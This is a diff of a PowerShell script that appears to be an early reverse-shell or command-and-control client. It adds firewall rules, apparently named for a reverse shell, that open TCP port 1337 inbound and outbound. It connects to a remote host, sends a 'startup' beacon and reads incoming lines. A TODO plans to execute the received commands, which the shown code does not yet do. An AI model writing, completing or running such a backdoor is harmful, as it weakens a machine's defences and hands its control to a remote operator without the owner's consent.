@@ -1,14 +1,10 @@
 if (!$(Get-NetFirewallRule -DisplayName "rs1in" 2>$null)) {
 	New-NetFirewallRule -DisplayName "rs1in" -Direction Inbound -LocalPort 1337 -Protocol TCP -Action Allow
-} else {
-	Write-Output "Rule already exists";
-}
+} 
 
 if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
 	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Allow
-} else {
-	Write-Output "Rule already exists";
-}
+} 
 
 
 
@@ -16,27 +12,28 @@ if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
 #TODO: Add rpc reciever to execute received commands.
 
 try {
-	$client = New-Object System.Net.Sockets.TCPClient("73.113.78.58", 1337);
+	$client = New-Object System.Net.Sockets.TCPClient("alm-testing.dev", 1337);
+	$client.ReceiveTimeout = 5000;
 	$stream = $client.GetStream();
 	$writer = New-Object System.IO.StreamWriter($stream);
 	$reader = New-Object System.IO.StreamReader($stream);
-	$writer.Write("startup");
-	$stream.Flush();
+	$writer.WriteLine("startup");
+	$writer.Flush();
 	$in_buff = [char[]]::new(1024)
-	$out_msg = "";
 	$exit = 0;
 	while ($exit -eq 0) {
-		while ($reader.Peek() -ge 0) {		
-			$in_buff = $reader.ReadLine();
-		}
-		if($stream.Connected) {
-			
-		} else {
-			$exit = 1;
-		}
-		Write-Output $in_buff;
+		if($client.Client.Poll(5000000,[System.Net.Sockets.SelectMode]::SelectRead) -eq $true) {
+			if ($client.Client.Available -eq 0) {
+				Write-Output "Connection to server lost";
+				$exit = 1;
+			} else {
+				while ($reader.Peek() -ge 0) {		
+					$in_buff = $reader.ReadLine();
+					Write-Output $in_buff;
+				}
+			}				
+		} 
 	}
-	$client.Close()
 }
 catch {
 	Write-Output $_;
